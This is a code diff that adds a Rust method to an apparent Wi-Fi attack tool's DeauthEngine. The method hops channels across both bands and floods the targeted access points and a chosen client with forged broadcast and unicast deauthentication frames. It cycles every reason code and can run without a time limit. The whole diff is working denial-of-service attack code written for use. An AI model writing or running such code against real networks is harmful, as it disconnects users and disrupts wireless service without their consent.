@@ -262,6 +262,71 @@ impl DeauthEngine {
         })
     }
 
+    /// Channel-hopping deauth burst covering both bands and rotating
+    /// through every reason code. When a station is supplied, each AP is hit
+    /// with both broadcast AND unicast frames so a client that filters one
+    /// form still gets the other. `duration_secs == 0` means "until Ctrl+C".
+    pub fn evacuation_attack_targeted(
+        &self,
+        bssid_list: &[String],
+        station_mac: Option<&str>,
+        duration_secs: u32,
+    ) -> Value {
+        let sock = match RawSocket::open(&self.interface) {
+            Ok(s) => s,
+            Err(e) => return json!({"error": e.to_string()}),
+        };
+        let parsed: Vec<[u8; 6]> = bssid_list.iter().filter_map(|b| parse_mac(b)).collect();
+        if parsed.is_empty() {
+            return json!({"error": "no valid BSSIDs"});
+        }
+        let st_parsed: Option<[u8; 6]> = station_mac.and_then(parse_mac);
+        let mut channels: Vec<u8> = Vec::new();
+        channels.extend_from_slice(&CHANNELS_24);
+        channels.extend_from_slice(&CHANNELS_5);
+        let started = Instant::now();
+        let deadline = if duration_secs == 0 {
+            Duration::from_secs(u64::MAX / 2)
+        } else {
+            Duration::from_secs(duration_secs as u64)
+        };
+        let mut sent = 0u64;
+        let mut seq = 0u16;
+        let mut ch_idx = 0usize;
+        while self.running.load(Ordering::SeqCst) && started.elapsed() < deadline {
+            set_channel(&self.interface, channels[ch_idx % channels.len()]);
+            ch_idx += 1;
+            for bssid in &parsed {
+                if !self.running.load(Ordering::SeqCst) {
+                    break;
+                }
+                let reason = REASON_CODES[seq as usize % REASON_CODES.len()];
+                // Broadcast frame (AP -> all clients)
+                let frame = deauth_frame(bssid, &[0xFF; 6], reason, seq);
+                if sock.send(&frame).is_ok() { sent += 1; }
+                seq = seq.wrapping_add(1);
+                // Targeted unicast (AP -> specific client) and reverse
+                if let Some(st) = st_parsed {
+                    let f1 = deauth_frame(bssid, &st, reason, seq);
+                    if sock.send(&f1).is_ok() { sent += 1; }
+                    seq = seq.wrapping_add(1);
+                    let f2 = deauth_frame(&st, bssid, reason, seq);
+                    if sock.send(&f2).is_ok() { sent += 1; }
+                    seq = seq.wrapping_add(1);
+                }
+            }
+            thread::sleep(Duration::from_millis(50));
+        }
+        self.packets_sent.fetch_add(sent, Ordering::Relaxed);
+        json!({
+            "sent": sent,
+            "aps": parsed.len(),
+            "targeted": st_parsed.is_some(),
+            "elapsed_s": started.elapsed().as_secs(),
+            "pps": (sent as f64 / started.elapsed().as_secs_f64().max(0.001)).round(),
+        })
+    }
+
     /// Send a single disassociation frame — used to nudge a client into a
     /// re-handshake without tearing down the whole link.
     pub fn send_disassoc(&self, bssid: &str, station: &str, reason: u8) -> Value {
